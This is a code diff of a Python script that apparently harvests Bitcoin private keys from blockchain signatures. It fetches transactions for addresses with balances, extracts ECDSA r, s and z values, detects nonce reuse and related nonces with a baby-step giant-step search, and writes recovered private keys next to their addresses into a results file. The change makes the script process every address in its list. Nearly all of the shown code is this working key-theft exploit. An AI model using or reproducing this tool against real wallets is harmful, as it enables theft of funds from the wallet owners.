@@ -6,7 +6,7 @@ import requests
 import argparse
 from urllib.request import urlopen
 from itertools import combinations
-from .secp256k1 import ice
+from rsz import secp256k1 as ice
 SATOSHIS_PER_BTC = 1e+8
 
 G = ice.scalar_multiplication(1)
@@ -187,80 +187,72 @@ def get_rsz(list,pvt,fail,begin):
                     try:
                         j_line = json.loads(response.text)
                         saldo = (float(j_line['confirmed_balance']))/SATOSHIS_PER_BTC
-                        if saldo == 0.0:
-                            print(f'{linha} - {address} - {saldo}')
-                            
-                            result_pvt.write(f'{linha} - {address} - {saldo}\n')
-                            print('-'*120)
-                            pass
-                        else:
-                            print(f'{linha} - {address} - {saldo}')
-                            
-                            result_pvt.write(f'{linha} - {address} - {saldo}\n')
-                            print('-'*120)
-                            txid, cdx = check_tx(address,fail)
-                            RQ, rL, sL, zL, QL = [], [], [], [], []
+                        print(f'{linha} - {address} - {saldo}')
+                        result_pvt.write(f'{linha} - {address} - {saldo}\n')
+                        print('-'*120)
+                        txid, cdx = check_tx(address,fail)
+                        RQ, rL, sL, zL, QL = [], [], [], [], []
 
-                            for c in range(len(txid)):
-                                rawtx = get_rawtx_from_blockchain(txid[c])
-                                try:
-                                    m = parseTx(rawtx)
-                                    e = getSignableTxn(m)
-                                    for i in range(len(e)):
-                                        if i == cdx[c]:
-                                            rL.append( int( e[i][0], 16) )
-                                            sL.append( int( e[i][1], 16) )
-                                            zL.append( int( e[i][2], 16) )
-                                            QL.append( ice.pub2upub(e[i][3]) )
-                                            print('='*70,f'\n[Input Index #: {i}] [txid: {txid[c]}]\n     R: {e[i][0]}\n     S: {e[i][1]}\n     Z: {e[i][2]}\nPubKey: {e[i][3]}')
-                                except: print(f'Skipped the Tx [{txid[c]}]........')
+                        for c in range(len(txid)):
+                            rawtx = get_rawtx_from_blockchain(txid[c])
+                            try:
+                                m = parseTx(rawtx)
+                                e = getSignableTxn(m)
+                                for i in range(len(e)):
+                                    if i == cdx[c]:
+                                        rL.append( int( e[i][0], 16) )
+                                        sL.append( int( e[i][1], 16) )
+                                        zL.append( int( e[i][2], 16) )
+                                        QL.append( ice.pub2upub(e[i][3]) )
+                                        print('='*70,f'\n[Input Index #: {i}] [txid: {txid[c]}]\n     R: {e[i][0]}\n     S: {e[i][1]}\n     Z: {e[i][2]}\nPubKey: {e[i][3]}')
+                            except: print(f'Skipped the Tx [{txid[c]}]........')
+                                
+                        print('='*70); print('-'*120)
+
+                        #==============================================================================
+                        for c in range(len(rL)):
+                            RQ.append( calc_RQ( rL[c], sL[c], zL[c], QL[c] ) )
+                            
+                        # RD = diff_comb(RQ)
+                        RD = diff_comb_idx(RQ)
+
+                        print('RQ = ')
+                        for i in RQ: print(f'{i.hex()}')
+                        print('='*70)
+                        print('RD = ')
+                        for i in RD: print(f'{i[2].hex()}')
+                        print('-'*120)
+                        cont = 0
+                        
+                        for i in RD:
+                            
+                            if i[2] == ZERO:
+                                cont = cont + 1
+                                if cont < 2:
+                                    print(f'Duplicate R Found. Congrats!. {i[0], i[1], i[2].hex()}')
+                                    print(f'Starting to prepare BSGS Table with {bP} elements')
+                                    ice.bsgs_2nd_check_prepare(bP)
+
+                                    solvable_diff = []
+                                    for Q in RD:
+                                        found, diff = ice.bsgs_2nd_check(Q[2], -1, bP)
+                                        if found == True:
+                                            solvable_diff.append((Q[0], Q[1], diff.hex()))       
                                     
-                            print('='*70); print('-'*120)
-
-                            #==============================================================================
-                            for c in range(len(rL)):
-                                RQ.append( calc_RQ( rL[c], sL[c], zL[c], QL[c] ) )
-                                
-                            # RD = diff_comb(RQ)
-                            RD = diff_comb_idx(RQ)
-
-                            print('RQ = ')
-                            for i in RQ: print(f'{i.hex()}')
-                            print('='*70)
-                            print('RD = ')
-                            for i in RD: print(f'{i[2].hex()}')
-                            print('-'*120)
-                            cont = 0
-                            
-                            for i in RD:
-                                
-                                if i[2] == ZERO:
-                                    cont = cont + 1
-                                    if cont < 2:
-                                        print(f'Duplicate R Found. Congrats!. {i[0], i[1], i[2].hex()}')
-                                        print(f'Starting to prepare BSGS Table with {bP} elements')
-                                        ice.bsgs_2nd_check_prepare(bP)
-
-                                        solvable_diff = []
-                                        for Q in RD:
-                                            found, diff = ice.bsgs_2nd_check(Q[2], -1, bP)
-                                            if found == True:
-                                                solvable_diff.append((Q[0], Q[1], diff.hex()))       
-                                        
-                                    #==============================================================================
+                                #==============================================================================
+                                    print('='*70); print('-'*120)
+                                    for i in solvable_diff:
+                                        print(f'[i={i[0]}] [j={i[1]}] [R Diff = {i[2]}]')
+                                        k = getk1(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int( i[2], 16) )
+                                        d = getpvk(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int( i[2], 16) )
+                                        pvk = hex(d)
+                                        print(f'Privatekey FOUND: {hex(d)}')
                                         print('='*70); print('-'*120)
-                                        for i in solvable_diff:
-                                            print(f'[i={i[0]}] [j={i[1]}] [R Diff = {i[2]}]')
-                                            k = getk1(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int( i[2], 16) )
-                                            d = getpvk(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int( i[2], 16) )
-                                            pvk = hex(d)
-                                            print(f'Privatekey FOUND: {hex(d)}')
-                                            print('='*70); print('-'*120)
-                                            result_pvt.write(f'PVK: {pvk} /ADDRESS: {address}\n')
+                                        result_pvt.write(f'PVK: {pvk} /ADDRESS: {address}\n')
                     except JSONDecodeError as e:
                         pass
 print('Program Finished ...')
-def mainBalanceRSZ():
+def mainAll():
       file_list = input("Entre con end. do file list com balance :  ")
       inicio = input("Entre com linha inicial :  ")
       file_pvtkey = (f'pvtkey_No_Zero_{file_list}')
